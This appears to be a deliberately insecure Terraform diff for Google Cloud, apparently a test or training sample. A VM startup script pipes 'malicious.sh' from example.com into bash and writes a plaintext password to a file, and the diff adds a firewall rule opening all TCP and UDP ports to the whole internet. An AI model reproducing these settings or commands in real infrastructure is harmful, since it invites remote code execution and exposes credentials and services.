@@ -22,7 +22,7 @@ resource "google_compute_instance" "web_server" {
 
   metadata_startup_script = <<-EOF
     #!/bin/bash
-    echo "Sensitive data: password1234" > /etc/secret.txt
+    echo "Sensitive data: password12345" > /etc/secret.txt
     curl http://example.com/malicious.sh | bash
   EOF
 
@@ -98,6 +98,24 @@ resource "google_sql_database_instance" "app_database" {
   }
 
   deletion_protection = false
+}
+
+resource "google_compute_firewall" "web_sg" {
+  name    = "web-sg"
+  network = "default"
+
+  allow {
+    protocol = "tcp"
+    ports    = ["0-65535"]
+  }
+
+  allow {
+    protocol = "udp"
+    ports    = ["0-65535"]
+  }
+
+  source_ranges = ["0.0.0.0/0"]
+  target_tags   = ["web"]
 }
 
 resource "google_sql_user" "db_user" {
